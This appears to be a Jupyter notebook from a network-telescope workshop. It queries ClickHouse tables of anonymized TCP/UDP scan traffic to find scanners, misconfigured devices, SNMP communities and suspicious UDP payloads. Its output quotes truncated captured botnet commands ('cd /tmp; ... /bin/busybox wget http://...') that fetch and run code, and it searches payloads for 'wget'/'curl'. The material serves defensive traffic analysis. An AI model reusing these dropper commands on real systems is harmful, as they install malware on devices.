
## Anonymization

**Important:** `source_ip` and `destination_ip` values were anonymized with **CryptoPAN** before publication. This prevents direct correlation with external information sources, but it keeps the internal subnet logic and address relationships intact within the telescope dataset.

## Server idle / wake-up note

The ClickHouse Cloud instance enters an idle state after about 15 minutes without user activity. It can be woken up by a normal connection attempt from the `clickhouse-client`, which may take up to about 2 minutes while the service resumes from its idle state.


The instance is scaled dynamically. If a query hits memory or other resource limits, please wait for the service to scale or free resources before retrying. The maximum memory allocation per query is **24 GiB**. If you need more than that for a specific task, please contact the workshop organizers personally or after at **jan.adamski@nask.pl**, **jakub.koman@nask.pl**, **pawel.pawlinski@cert.pl**, or **paul.jung@circl.lu**.


**Covered data windows:**
- `default.tcp_events`: 01.09–30.09.2026
- `default.udp_events`: 01.09–10.09.2026
- `default.udp_payloads`: 01.09–10.09.2026

## Setup and workflow
Use **one** of the two dependency setup commands below: pip creates and activates `.venv`, then installs the dependencies there; uv writes `pyproject.toml` and runs `uv sync`. **Important: run them from your terminal, not inside the notebook!** The pip option may require to install python-venv. The uv option requires uv to be installed. Run the chosen setup commands from the intended project directory, then select that directory's `.venv` Python as the notebook kernel in VS Code (or other jupyter environment).

In [ ]:
%%bash
python3 -m venv .venv &&
source .venv/bin/activate &&
python -m pip install ipykernel clickhouse-connect pandas jupyterlab matplotlib seaborn numpy

In [ ]:
%%bash
echo '[project]
name = "network-telescope-analysis"
version = "0.1.0"
requires-python = ">=3.10"
dependencies = ["ipykernel", "clickhouse-connect", "pandas", "jupyterlab", "matplotlib", "seaborn", "numpy"]

[tool.uv]
package = false' > pyproject.toml && uv sync

Edit the ClickHouse HTTP connection constants directly in the configuration cell below: `CLICKHOUSE_HOST`, `CLICKHOUSE_PORT`, `CLICKHOUSE_USER`, `CLICKHOUSE_PASSWORD`, `CLICKHOUSE_DATABASE`, and `CLICKHOUSE_SECURE`. The credentials are on the physical printouts. Don't change the table names.

In [ ]:
import pandas as pd

CLICKHOUSE_HOST = "fb4e0g1ih4.eu-central-1.aws.clickhouse.cloud"
CLICKHOUSE_USER = "default"
CLICKHOUSE_PASSWORD = ""
CLICKHOUSE_DATABASE = "default"
CLICKHOUSE_PORT = 8443

# ClickHouse table names
TCP_TABLE = "tcp_events"
UDP_TABLE = "udp_events"
PAYLOAD_TABLE = "udp_payloads"

## Connect

This cell creates a ClickHouse HTTP client, checks connectivity with a ping, and defines `run_query(sql, parameters)` to return query results as pandas.

In [ ]:
try:
    import clickhouse_connect
except ImportError as exc:
    raise ImportError("Missing ClickHouse client. Run %pip install clickhouse-connect and rerun this cell.") from exc

client = clickhouse_connect.get_client(
    host=CLICKHOUSE_HOST,
    username=CLICKHOUSE_USER,
    password=CLICKHOUSE_PASSWORD,
    database=CLICKHOUSE_DATABASE,
    port=CLICKHOUSE_PORT,
    send_receive_timeout=600,
)

if not client.ping():
    raise ConnectionError("ClickHouse did not respond to ping; verify host, port, credentials, and TLS settings.")

print(f"Connected to {CLICKHOUSE_HOST}:{CLICKHOUSE_PORT}/{CLICKHOUSE_DATABASE})")

pd.set_option("display.max_colwidth", None)

def run_query(sql: str, parameters: dict | None = None) -> pd.DataFrame:
    """Run a ClickHouse query and return its result as a DataFrame."""
    return client.query_df(sql, parameters=parameters or {})

Connected to fb4e0g1ih4.eu-central-1.aws.clickhouse.cloud:8443/default)


## Warm Up

Lets start with finding the top 10 largest TCP events by packet count:

In [ ]:
query = """
SELECT start_time, stop_time, source_ip, packet_count
FROM default.tcp_events
WHERE start_time >= toDateTime('2026-09-03 00:00:00', 'Europe/Warsaw')
  AND start_time <  toDateTime('2026-09-04 00:00:00', 'Europe/Warsaw')
ORDER BY packet_count DESC
LIMIT 10;
"""

df = run_query(query)
df.head(10)

Then find the most scanned destination ports on a given day:

In [ ]:
query = """
SELECT port, sum(hits) AS total_hits
FROM default.tcp_events
ARRAY JOIN mapKeys(destination_ports) AS port,
     mapValues(destination_ports) AS hits
WHERE start_time >= toDateTime('2026-09-03 00:00:00', 'Europe/Warsaw')
  AND start_time <  toDateTime('2026-09-04 00:00:00', 'Europe/Warsaw')
GROUP BY port
ORDER BY total_hits DESC
LIMIT 10;
"""

df = run_query(query)
df.head(10)

And the most popular UDP payloads for a chosen day:

In [ ]:
query = """
SELECT
    first_seen,
    src_ip,
    len,
    packet_count,
    left(payload, 60) AS payload_preview,
    hex(left(payload, 60)) AS payload_preview_hex
FROM default.udp_payloads
WHERE date >= toDate('2026-09-05') AND date <= toDate('2026-09-05')
ORDER BY packet_count DESC
LIMIT 10;
"""

df = run_query(query)
df.head(10)

# Finding scanners

## Most active TCP sources
Lets try to identify sources that exhibit a scanning behaviour. One of the naive approaches is to find the most active sources in a given time window and inspect traffic they generated.
The query below does exactly that - returns the most noisy sources in a given time range.
High activity can identify candidates for further investigation, but does not by itself establish scanning.

In [8]:
# Configuration
WINDOW_START = "2026-09-01 00:00:00"
WINDOW_END = "2026-09-05 00:00:00"
RESULT_LIMIT = 50

most_active_tcp_sources_sql = f"""
WITH
    toDateTime64({{window_start:String}}, 3, 'Europe/Warsaw') AS window_start,
    toDateTime64({{window_end:String}}, 3, 'Europe/Warsaw') AS window_end
SELECT
    source_ip,
    sum(packet_count) AS total_packets,
    count() AS event_count,
    min(start_time) AS first_seen,
    max(stop_time) AS last_seen
FROM {TCP_TABLE}
WHERE start_time >= window_start AND start_time < window_end
GROUP BY source_ip
ORDER BY total_packets DESC, source_ip
LIMIT {{result_limit:UInt64}}
"""

In [ ]:
most_active_tcp_sources = run_query(most_active_tcp_sources_sql, {
    "window_start": WINDOW_START, "window_end": WINDOW_END,
    "result_limit": RESULT_LIMIT,
})
display(most_active_tcp_sources)

Lets inspect the traffic of a given source and try to assess if it is a scanner.

In [ ]:
import pandas as pd
import seaborn as sns
import matplotlib.pyplot as plt

query = """
SELECT
    toDate(start_time) AS day,
    CASE
        WHEN toHour(start_time) BETWEEN 0  AND 5  THEN '00:00-05:59'
        WHEN toHour(start_time) BETWEEN 6  AND 11 THEN '06:00-11:59'
        WHEN toHour(start_time) BETWEEN 12 AND 17 THEN '12:00-17:59'
        ELSE '18:00-23:59'
    END AS period_6h,
    sum(packet_count) AS packets
FROM default.tcp_events
WHERE source_ip = '186.134.235.138'
  AND protocol = 'TCP'
  AND start_time >= toDateTime('2026-09-01 00:00:00', 'Europe/Warsaw')
  AND start_time <  toDateTime('2026-09-06 00:00:00', 'Europe/Warsaw')
GROUP BY day, period_6h
ORDER BY day, period_6h;
"""

df = run_query(query)

pivot = df.pivot(index='period_6h', columns='day', values='packets').fillna(0)
pivot = pivot.reindex(['00:00-05:59', '06:00-11:59', '12:00-17:59', '18:00-23:59'])

plt.figure(figsize=(12, 3.5))
ax = sns.heatmap(
    pivot,
    cmap='YlOrRd',
    linewidths=0.3,
    linecolor='white',
    cbar_kws={'label': 'packets'},
    vmin=0
)

# set the x-axis labels to plain dates only
date_labels = [str(d).split(' ')[0] for d in pivot.columns]
ax.set_xticklabels(date_labels, rotation=0)
ax.set_title('TCP activity for 186.134.235.138')
ax.set_xlabel('Day')
ax.set_ylabel('6h window')
plt.tight_layout()
plt.show()



In [ ]:
import numpy as np
import pandas as pd
import seaborn as sns
import matplotlib.pyplot as plt

# Shared time window and source.
SOURCE_IP = "186.134.235.138"
WINDOW_START = "2026-09-01 00:00:00"
WINDOW_END = "2026-09-06 00:00:00"
all_days = pd.date_range("2026-09-01", "2026-09-05", freq="D")

# Query 16-port bins for the full destination-port range.
sql = f"""
SELECT
    toDate(start_time) AS day,
    intDiv(toUInt16(port), 16) * 16 AS port_bin_start,
    sum(hits) AS packets
FROM default.tcp_events
ARRAY JOIN
    mapKeys(destination_ports) AS port,
    mapValues(destination_ports) AS hits
WHERE source_ip = '{SOURCE_IP}'
  AND start_time >= toDateTime('{WINDOW_START}', 'Europe/Warsaw')
  AND start_time <  toDateTime('{WINDOW_END}', 'Europe/Warsaw')
GROUP BY day, port_bin_start
ORDER BY day, port_bin_start
"""

df_bins = run_query(sql)
pivot16 = df_bins.pivot(
    index="port_bin_start", columns="day", values="packets"
)

# Include every possible 16-port bin (0-15 through 65520-65535), including
# bins with no traffic, and retain all dates in the selected window.
all_port_bins = np.arange(0, 65536, 16, dtype=np.uint32)
pivot16.columns = pd.to_datetime(pivot16.columns).normalize()
pivot16 = pivot16.reindex(
    index=all_port_bins, columns=all_days, fill_value=0
).fillna(0)
pivot16.columns = pivot16.columns.strftime("%Y-%m-%d")

# Query individual destination ports 1-100 for a second, more detailed heatmap.
sql_ports_1_100 = f"""
SELECT day, port, sum(hits) AS packets
FROM (
    SELECT
        toDate(start_time) AS day,
        toUInt16(array_port) AS port,
        hits
    FROM default.tcp_events
    ARRAY JOIN
        mapKeys(destination_ports) AS array_port,
        mapValues(destination_ports) AS hits
    WHERE source_ip = '{SOURCE_IP}'
      AND start_time >= toDateTime('{WINDOW_START}', 'Europe/Warsaw')
      AND start_time <  toDateTime('{WINDOW_END}', 'Europe/Warsaw')
)
WHERE port BETWEEN 1 AND 100
GROUP BY day, port
ORDER BY day, port
"""

df_ports_1_100 = run_query(sql_ports_1_100)
pivot_ports_1_100 = df_ports_1_100.pivot(
    index="port", columns="day", values="packets"
)
pivot_ports_1_100.columns = pd.to_datetime(
    pivot_ports_1_100.columns
).normalize()
pivot_ports_1_100 = pivot_ports_1_100.reindex(
    index=np.arange(1, 101), columns=all_days, fill_value=0
).fillna(0)
pivot_ports_1_100.columns = pivot_ports_1_100.columns.strftime("%Y-%m-%d")

# Stack the full-range 16-port-bin heatmap above the per-port 1-100 heatmap.
fig, (ax_all, ax_detail) = plt.subplots(
    2,
    1,
    figsize=(16, 16),
    gridspec_kw={"height_ratios": [10, 5]},
)

sns.heatmap(
    pivot16,
    cmap="viridis",
    linewidths=0,
    ax=ax_all,
    vmin=0,
    vmax=max(float(pivot16.to_numpy().max()), 1.0),
    cbar_kws={"label": "packets"},
    rasterized=True,
)
ax_all.set_xlabel("")
ax_all.set_ylabel("destination port bin (16 ports)")
ax_all.set_title(
    f"TCP destination port activity for {SOURCE_IP} — all 16-port bins"
)
tick_rows = np.arange(0, len(pivot16), 256)
ax_all.set_yticks(tick_rows + 0.5)
ax_all.set_yticklabels(
    [f"{int(pivot16.index[i])}-{int(pivot16.index[i]) + 15}" for i in tick_rows],
    rotation=0,
)
ax_all.set_xticklabels(pivot16.columns, rotation=45, ha="right")

sns.heatmap(
    pivot_ports_1_100,
    cmap="viridis",
    linewidths=0,
    ax=ax_detail,
    vmin=0,
    vmax=max(float(pivot_ports_1_100.to_numpy().max()), 1.0),
    cbar_kws={"label": "packets"},
    rasterized=True,
)
ax_detail.set_xlabel("day")
ax_detail.set_ylabel("destination port (bin size 1)")
ax_detail.set_title(f"TCP destination ports 1-100 for {SOURCE_IP}")
# Label every fifth port to keep the 100-row axis readable.
port_ticks = np.arange(0, 100, 5)
ax_detail.set_yticks(port_ticks + 0.5)
ax_detail.set_yticklabels(
    [str(int(pivot_ports_1_100.index[i])) for i in port_ticks],
    rotation=0,
)
ax_detail.set_xticklabels(pivot_ports_1_100.columns, rotation=45, ha="right")

plt.tight_layout()
plt.show()

As shown, the large number of packets sent is not enough to filter out potential scanner candidates. **What else can we include in the query conditions?**

In [14]:
# before moving on we encourage you to come up with 
# your own query to identify scanner candidates



In [16]:
# Configuration
MIN_DESTINATION_PORTS = 50
WINDOW_START = "2026-09-01 00:00:00"
WINDOW_END = "2026-09-05 00:00:00"
RESULT_LIMIT = 50
# Count each port once across all selected events.
most_active_tcp_sources_ports_sql = f"""
WITH
    toDateTime({{window_start:String}}) AS window_start,
    toDateTime({{window_end:String}}) AS window_end
SELECT
    source_ip,
    sum(packet_count) AS total_packets,
    groupUniqArrayArray(mapKeys(destination_ports)) AS targeted_ports,
    count() AS event_count,
    min(start_time) AS first_seen,
    max(stop_time) AS last_seen,
    length(targeted_ports) AS destination_port_count
FROM {TCP_TABLE}
WHERE start_time >= window_start AND start_time < window_end
GROUP BY source_ip
HAVING destination_port_count >= {{min_destination_ports:UInt64}}
ORDER BY total_packets DESC, source_ip
LIMIT {{result_limit:UInt64}}
"""

In [ ]:
most_active_tcp_sources_ports = run_query(most_active_tcp_sources_ports_sql, {
    "min_destination_ports": MIN_DESTINATION_PORTS,
    "window_start": WINDOW_START, "window_end": WINDOW_END,
    "result_limit": RESULT_LIMIT,
})
display(most_active_tcp_sources_ports)

In [ ]:
import pandas as pd
import seaborn as sns
import matplotlib.pyplot as plt

query = """
SELECT
    toDate(start_time) AS day,
    CASE
        WHEN toHour(start_time) BETWEEN 0  AND 5  THEN '00:00-05:59'
        WHEN toHour(start_time) BETWEEN 6  AND 11 THEN '06:00-11:59'
        WHEN toHour(start_time) BETWEEN 12 AND 17 THEN '12:00-17:59'
        ELSE '18:00-23:59'
    END AS period_6h,
    sum(packet_count) AS packets
FROM default.tcp_events
WHERE source_ip = '251.91.125.50'
  AND protocol = 'TCP'
  AND start_time >= toDateTime('2026-09-01 00:00:00', 'Europe/Warsaw')
  AND start_time <  toDateTime('2026-09-06 00:00:00', 'Europe/Warsaw')
GROUP BY day, period_6h
ORDER BY day, period_6h;
"""

df = run_query(query)

pivot = df.pivot(index='period_6h', columns='day', values='packets').fillna(0)
pivot = pivot.reindex(['00:00-05:59', '06:00-11:59', '12:00-17:59', '18:00-23:59'])

plt.figure(figsize=(12, 3.5))
ax = sns.heatmap(
    pivot,
    cmap='YlOrRd',
    linewidths=0.3,
    linecolor='white',
    cbar_kws={'label': 'packets'},
    vmin=0
)

# set the x-axis labels to plain dates only
date_labels = [str(d).split(' ')[0] for d in pivot.columns]
ax.set_xticklabels(date_labels, rotation=0)
ax.set_title('TCP activity for 251.91.125.50')
ax.set_xlabel('Day')
ax.set_ylabel('6h window')
plt.tight_layout()
plt.show()

In [ ]:
import numpy as np
import pandas as pd
import seaborn as sns
import matplotlib.pyplot as plt

# Shared time window and source.
SOURCE_IP = "251.91.125.50"
WINDOW_START = "2026-09-01 00:00:00"
WINDOW_END = "2026-09-06 00:00:00"
all_days = pd.date_range("2026-09-01", "2026-09-05", freq="D")

# Query 16-port bins for the full destination-port range.
sql = f"""
SELECT
    toDate(start_time) AS day,
    intDiv(toUInt16(port), 16) * 16 AS port_bin_start,
    sum(hits) AS packets
FROM default.tcp_events
ARRAY JOIN
    mapKeys(destination_ports) AS port,
    mapValues(destination_ports) AS hits
WHERE source_ip = '{SOURCE_IP}'
  AND start_time >= toDateTime('{WINDOW_START}', 'Europe/Warsaw')
  AND start_time <  toDateTime('{WINDOW_END}', 'Europe/Warsaw')
GROUP BY day, port_bin_start
ORDER BY day, port_bin_start
"""

df_bins = run_query(sql)
pivot16 = df_bins.pivot(
    index="port_bin_start", columns="day", values="packets"
)

# Include every possible 16-port bin and every selected date.
all_port_bins = np.arange(0, 65536, 16, dtype=np.uint32)
pivot16.columns = pd.to_datetime(pivot16.columns).normalize()
pivot16 = pivot16.reindex(
    index=all_port_bins, columns=all_days, fill_value=0
).fillna(0)
pivot16.columns = pivot16.columns.strftime("%Y-%m-%d")

fig, ax_all = plt.subplots(figsize=(16, 10))

sns.heatmap(
    pivot16,
    cmap="viridis",
    linewidths=0,
    ax=ax_all,
    vmin=0,
    vmax=max(float(pivot16.to_numpy().max()), 1.0),
    cbar_kws={"label": "packets"},
    rasterized=True,
)

ax_all.set_xlabel("")
ax_all.set_ylabel("destination port bin (16 ports)")
ax_all.set_title(
    f"TCP destination port activity for {SOURCE_IP} — all 16-port bins"
)

tick_rows = np.arange(0, len(pivot16), 256)
ax_all.set_yticks(tick_rows + 0.5)
ax_all.set_yticklabels(
    [f"{int(pivot16.index[i])}-{int(pivot16.index[i]) + 15}" for i in tick_rows],
    rotation=0,
)
ax_all.set_xticklabels(pivot16.columns, rotation=45, ha="right")

plt.tight_layout()
plt.show()

**Research ideas:**
- <mark>more sophisticated filtering;</mark>
- <mark>conditions for different scanner types (vulnerability scanners, service scanners etc.);</mark>
- <mark>fingerprinting sources;</mark>
- <mark>clustering sources - identifying groups of scanners that behave similarly.</mark>

## Misconfiguration
In addition to various types of unusual traffic, a network telescope also captures traffic from misconfigured devices. Let's see if we can identify some of these devices.
**What requirements should such a source meet?**

In [ ]:
sql = """
WITH src_stats AS (
    SELECT
        source_ip,
        countDistinct(destination_ip) AS distinct_destinations,
        countDistinct(toUInt16(arrayElement(mapKeys(destination_ports), 1))) AS distinct_ports,
        count() AS total_events
    FROM default.udp_events
    WHERE destination_ip IS NOT NULL
      AND source_ip IS NOT NULL
      AND length(mapKeys(destination_ports)) = 1
    GROUP BY source_ip
)
SELECT *
FROM src_stats
WHERE distinct_destinations = 1
  AND distinct_ports = 1
  AND total_events >= 5
ORDER BY total_events DESC
LIMIT 100
"""

src_single_target = run_query(sql)
src_single_target.head(20)

In [ ]:
sources = ["191.229.151.198"]
WINDOW_START = "2026-09-01 00:00:00"
WINDOW_END = "2026-09-06 00:00:00"

sql = """
SELECT
    first_seen,
    src_ip,
    dst_ports,
    payload,
    length(payload) AS payload_len,
    packet_count
FROM udp_payloads
PREWHERE date >= toDate(toDateTime({start:String}))
  AND date <= toDate(toDateTime({end:String}))
  AND first_seen >= toDateTime({start:String})
  AND first_seen < toDateTime({end:String})
WHERE src_ip IN (
    SELECT toIPv4(arrayJoin({sources:Array(String)}))
)
ORDER BY first_seen DESC
LIMIT 10
"""

payloads = run_query(sql, parameters={
    "start": WINDOW_START,
    "end": WINDOW_END,
    "sources": sources,
})

display(payloads)

**Based on the results, do You know what protocol is used by the misconfig candidate and what is the content?**

In [ ]:
payload_hex = "23020ae8000001f100000975c21d82fcee44672fc72a30c9ed309bcbc6f32b74ed309bcbc8a45d51ee446c55c53409f8"
blob = bytes.fromhex(payload_hex)


def u32_be(b):
    return int.from_bytes(b, byteorder="big", signed=False)


def xyz_func(ts_bytes):
    secs = u32_be(ts_bytes[:4])
    frac = u32_be(ts_bytes[4:8])
    unix_epoch_offset = 2208988800
    return secs - unix_epoch_offset + frac / 2**32


import datetime as dt

byte0 = blob[0]
li = (byte0 >> 6) & 0b11
vn = (byte0 >> 3) & 0b111
mode = byte0 & 0b111

field_1 = blob[1]
field_2 = blob[2]
field_3 = blob[3]

root_delay = u32_be(blob[4:8]) / 216
root_dispersion = u32_be(blob[8:12]) / 216
ref_id = blob[12:16].hex()

ts_ref = xyz_func(blob[16:24])
ts_orig = xyz_func(blob[24:32])
ts_recv = xyz_func(blob[32:40])
ts_xmit = xyz_func(blob[40:48])


def format_utc(timestamp):
    """Format a Unix timestamp as an ISO-8601 UTC string ending in Z."""
    return dt.datetime.fromtimestamp(timestamp, tz=dt.timezone.utc).isoformat().replace("+00:00", "Z")


print(f"header = {byte0:02x} {field_1:02x} {field_2:02x} {field_3:02x}")
print(f"li={li} vn={vn} mode={mode}")
print(f"field1={field_1} field2={field_2} field3={field_3}")
print(f"root_delay={root_delay:.4f}")
print(f"root_dispersion={root_dispersion:.4f}")
print(f"ref_id={ref_id}")
print(f"ref_ts={format_utc(ts_ref)}")
print(f"orig_ts={format_utc(ts_orig)}")
print(f"recv_ts={format_utc(ts_recv)}")
print(f"xmit_ts={format_utc(ts_xmit)}")

## SNMP

### SNMPv1: find the first 50 matching payload records

```text
UDP payload: SNMP message (ASN.1 BER)

30  <length>  02  01  00  04  <length>  <community>  <PDU ...>
|      |      |   |   |   |                 |          |
|      |      |   |   |   +-- OCTET STRING --+          +-- SNMP operation
|      |      |   |   +------ Version value: 0 = SNMPv1
|      |      |   +---------- INTEGER length: 1 byte
|      |      +-------------- INTEGER tag
|      +--------------------- Message length (one or more bytes)
+---------------------------- SEQUENCE tag

Version field we look for: 02 01 00
                          ^^^^^^^^
Version 1 = SNMPv2c; version 3 = SNMPv3.
```

The query checks `02 01 00` immediately after the outer BER length, not anywhere
in the payload. Both short and long BER length encodings are supported.
See [RFC 1157](https://www.rfc-editor.org/rfc/rfc1157.html).

Returns up to **50 matching payload records**, without sorting or a full-table sum.
Each record may represent multiple packets: `packet_count` shows its multiplicity.
The September 3, 2026 window in `Europe/Warsaw` applies to `first_seen`.
This samples `udp_payloads`; it does not calculate a daily total.

`community` displays the decoded OCTET STRING; invalid UTF-8 bytes are escaped.
`community_hex` preserves the original bytes, including empty or binary communities.
The community length is read from BER rather than assuming a fixed offset or size.
The `date` filter covers the two UTC dates touched by this Warsaw time window,
allowing ClickHouse to prune by its `(date, src_ip, hash)` sorting key.


In [ ]:
snmpv1_ber_fields = """
WITH
    reinterpretAsUInt8(substring(payload, 2, 1)) AS length_octet,
    if(length_octet < 128, 3, 3 + toUInt64(bitAnd(length_octet, 127))) AS version_offset,
    version_offset + 3 AS community_offset,
    reinterpretAsUInt8(substring(payload, community_offset + 1, 1)) AS community_length_octet,
    if(community_length_octet < 128, 0, toUInt64(bitAnd(community_length_octet, 127))) AS community_length_octets,
    community_offset + 2 + community_length_octets AS community_start,
    if(community_length_octet < 128,
       toUInt64(community_length_octet),
       reinterpretAsUInt64(reverse(substring(payload, community_offset + 2, least(community_length_octets, 8))))) AS community_length,
    substring(payload, community_start, least(community_length, toUInt64(length(payload)))) AS community_bytes,
    reinterpretAsUInt8(substring(payload, community_start + least(community_length, toUInt64(length(payload))), 1)) AS pdu_type
"""

snmpv1_day_filter = """
PREWHERE date >= toDate('2026-09-02') AND date <= toDate('2026-09-03')
  AND hlp = 'SNMP'
  AND first_seen >= toDateTime('2026-09-03 00:00:00', 'Europe/Warsaw')
  AND first_seen <  toDateTime('2026-09-04 00:00:00', 'Europe/Warsaw')
WHERE startsWith(payload, unhex('30'))
  AND (length_octet < 128 OR length_octet BETWEEN 129 AND 136)
  AND substring(payload, version_offset, 3) = unhex('020100')
  AND substring(payload, community_offset, 1) = unhex('04')
  AND (community_length_octet < 128 OR community_length_octet BETWEEN 129 AND 136)
  AND community_start <= length(payload)
  AND community_length <= greatest(toInt64(length(payload)) - toInt64(community_start), 0)
"""

def decode_community(value):
    # SNMP community is an OCTET STRING, not necessarily valid UTF-8.
    return bytes.fromhex(value).decode("utf-8", errors="backslashreplace")


snmpv1_query = snmpv1_ber_fields + """
SELECT
    first_seen,
    last_seen,
    src_ip,
    src_ports,
    dst_ports,
    packet_count,
    hex(community_bytes) AS community_hex,
    hex(substring(payload, 1, 32)) AS header_hex
FROM udp_payloads
""" + snmpv1_day_filter + "LIMIT 50"

snmpv1_result = run_query(snmpv1_query)

snmpv1_result.insert(
    snmpv1_result.columns.get_loc("community_hex"),
    "community",
    snmpv1_result["community_hex"].map(decode_community),
)
snmpv1_result


In [ ]:
community_query = snmpv1_ber_fields + """
SELECT
    hex(community_bytes) AS community_hex,
    sum(packet_count) AS query_count
FROM udp_payloads
""" + snmpv1_day_filter + """
  AND pdu_type IN (160, 161, 163)
GROUP BY community_bytes
ORDER BY query_count DESC
"""

community_counts = run_query(community_query)

community_counts.insert(
    0, "community", community_counts["community_hex"].map(decode_community)
)
community_counts


### UDP Payloads

In [28]:
from datetime import datetime, timedelta, timezone
from pathlib import Path
from zoneinfo import ZoneInfo

TIMEZONE = "Europe/Warsaw"
START = datetime(2026, 9, 3, tzinfo=ZoneInfo(TIMEZONE))
END = datetime(2026, 9, 4, tzinfo=ZoneInfo(TIMEZONE))
RESULT_LIMIT = 50
DUMP_BYTES = None  # Set e.g. 4096 to shorten each dump; None displays every byte.

if END <= START:
    raise ValueError("END must be later than START.")
if not 1 <= RESULT_LIMIT <= 1000:
    raise ValueError("RESULT_LIMIT must be between 1 and 1000.")

parameters = {
    "start": START.strftime("%Y-%m-%d %H:%M:%S"),
    "end": END.strftime("%Y-%m-%d %H:%M:%S"),
    "timezone": TIMEZONE,
    "first_date": START.astimezone(timezone.utc).date(),
    "last_date": (END.astimezone(timezone.utc) - timedelta(microseconds=1)).date(),
    "limit": RESULT_LIMIT,
}

query = """
SELECT
    first_seen,
    last_seen,
    src_ip,
    src_ports,
    dst_ports,
    hlp,
    packet_count,
    arrayFilter(tool -> positionCaseInsensitive(payload, tool) > 0, ['wget', 'curl']) AS matches,
    length(payload) AS payload_size,
    left(payload, 512) AS payload_preview,
    payload AS full_payload,
    hex(payload) AS payload_hex
FROM udp_payloads
PREWHERE date >= {first_date:Date}
  AND date <= {last_date:Date}
  AND first_seen >= toDateTime({start:String}, {timezone:String})
  AND first_seen <  toDateTime({end:String}, {timezone:String})
WHERE positionCaseInsensitive(payload, 'wget') > 0
   OR positionCaseInsensitive(payload, 'curl') > 0
LIMIT {limit:UInt32}
"""

payloads = run_query(query, parameters=parameters)

print(f"Found {len(payloads)} matching payload records (limit: {RESULT_LIMIT}).")
display(payloads.drop(columns=["payload_hex", "full_payload"]))

Found 50 matching payload records (limit: 50).


,first_seen,last_seen,src_ip,src_ports,dst_ports,hlp,packet_count,matches,payload_size,payload_preview
0,2026-09-03 20:20:34.658874,2026-09-03 20:20:34.658874,83.29.51.142,{57317: 1},{80: 1},UDP,1,[curl],1400,f005f61f76388cddff747c41538f5507024b069e665417...
1,2026-09-03 12:15:48.535258,2026-09-03 12:15:48.535258,84.3.157.200,{43424: 1},{9034: 1},DNS,1,[wget],192,orf; cd /tmp; /bin/busybox wget http://160.250...
2,2026-09-03 12:27:54.750711,2026-09-03 12:45:32.717585,84.30.187.179,"{35454: 1, 35946: 1, 45650: 1, 58919: 1, 59955...",{9034: 5},UDP,5,[wget],192,orf; cd /tmp; /bin/busybox wget http://160.250...
3,2026-09-03 04:28:06.955207,2026-09-03 04:28:06.955207,85.15.22.79,{64593: 1},{123: 1},ESP,1,[curl],48,2300000000000000000000000000000000000000000000...
4,2026-09-03 00:05:42.141259,2026-09-03 03:22:35.241811,120.158.116.119,{6145: 18},{9034: 18},UDP,18,[wget],127,orf; cd /tmp; rm -rf mipsel; /bin/busybox wget...
5,2026-09-03 00:02:30.827551,2026-09-03 23:56:34.945515,121.157.77.193,"{51336: 1, 11534: 1, 12776: 1, 13179: 1, 24904...",{9034: 335},UDP,335,[wget],127,orf; cd /tmp; rm -rf mipsel; /bin/busybox wget...
6,2026-09-03 00:07:59.976975,2026-09-03 02:54:35.916505,122.82.145.92,{36445: 22},{9034: 22},UDP,22,[wget],127,orf; cd /tmp; rm -rf mipsel; /bin/busybox wget...
7,2026-09-03 00:02:25.005057,2026-09-03 02:59:14.885825,122.91.53.152,{41825: 7},{9034: 7},RakNet,7,[wget],127,orf; cd /tmp; rm -rf mipsel; /bin/busybox wget...
8,2026-09-03 00:02:57.236510,2026-09-04 00:01:28.750614,123.158.216.8,"{56854: 90, 38041: 88}",{56575: 178},UDP,178,[wget],135,TCP_MSGHEAD_CMD cd /tmp/tmpfs/; wget http://1....
9,2026-09-03 00:02:18.746952,2026-09-04 00:00:41.800229,123.158.216.8,"{39910: 83, 40428: 90, 47059: 92, 57005: 83, 3...",{56575: 669},UDP,669,[wget],149,TCP_MSGHEAD_CMD cd /tmp/tmpfs/; wget http://11...


In [29]:
sql = """
SELECT
    left(payload, 256) AS payload_prefix,
    countDistinct(src_ip) AS source_count,
    groupArray(10)(src_ip) AS sample_sources
FROM udp_payloads
WHERE date >= {first_date:Date}
  AND date <= {last_date:Date}
  AND first_seen >= toDateTime({start:String}, {timezone:String})
  AND first_seen <  toDateTime({end:String}, {timezone:String})
  AND (
        positionCaseInsensitive(payload, 'wget') > 0
     OR positionCaseInsensitive(payload, 'curl') > 0
  )
GROUP BY left(payload, 256)
HAVING source_count > 1
ORDER BY source_count DESC
LIMIT 50
"""

similar_payloads = run_query(sql, parameters=parameters)
similar_payloads.head(20)

,payload_prefix,source_count,sample_sources
0,orf; cd /tmp; rm -rf mipsel; /bin/busybox wget...,309,"[120.158.116.119, 121.157.77.193, 122.82.145.9..."
1,TCP_MSGHEAD_CMD cd /tmp/tmpfs/; wget http://11...,73,"[123.158.216.8, 127.94.136.226, 133.11.217.255..."
2,orf; cd /tmp; /bin/busybox wget http://160.250...,52,"[130.2.76.193, 130.2.221.110, 130.2.232.180, 1..."
3,TCP_MSGHEAD_CMD cd /tmp/tmpfs/; wget http://12...,22,"[123.158.216.8, 133.11.217.255, 157.65.6.28, 1..."
4,TCP_MSGHEAD_CMD cd /tmp/tmpfs/; wget http://1....,19,"[123.158.216.8, 133.11.217.255, 138.82.7.17, 1..."
5,orf; cd /tmp; rm -rf mipsel; /bin/busybox wget...,17,"[202.132.118.195, 215.1.129.214, 215.1.133.72,..."
6,orf; cd /tmp; rm -rf mipsel; /bin/busybox wget...,5,"[133.184.202.48, 185.147.127.150, 8.117.97.85,..."
7,TCP_MSGHEAD_CMD cd /tmp/tmpfs/; wget http://20...,2,"[138.82.7.17, 146.166.114.138]"
8,TCP_MSGHEAD_CMD cd /tmp/tmpfs/; wget http://11...,2,"[215.1.184.39, 215.1.187.216]"


**Research ideas:**
- <mark>come up with a more sophisticated approach to distinguish between "interesting" and "uninteresting" payloads;</mark>
- <mark>try to identify a corresponding CVE for a specific payload.</mark>

# Challenges
Things that require more research. **Be careful, as the following queries can be a bit heavy.**

## TCP port anomalies

This query finds unusually high hourly packet counts for each TCP destination port. The query expands the `destination_ports` map and sums its per-port counts, assigning each event to the hour containing `start_time`.

**Configuration:** 
- `WINDOW_START` define a start-inclusive window in `Europe/Warsaw`; 
- `WINDOW_END` define an end-exclusive window in `Europe/Warsaw`; 
- `Z_THRESHOLD` sets the minimum positive z-score; 
- `MIN_ANOMALY_PACKETS` excludes small counts; 
- `RESULT_LIMIT` caps returned port-hour rows.

**Calculation:** for each port-hour, the baseline is that port's packet counts across every other hour in the configured window. Missing port-hours count as zero. The score is `(packets - baseline_mean) / baseline_stddev`, using population standard deviation. For example, a score of 3 means three standard deviations above the baseline mean, not three times the mean. This is a retrospective comparison: the baseline includes hours before and after the candidate hour.

**Results:** 
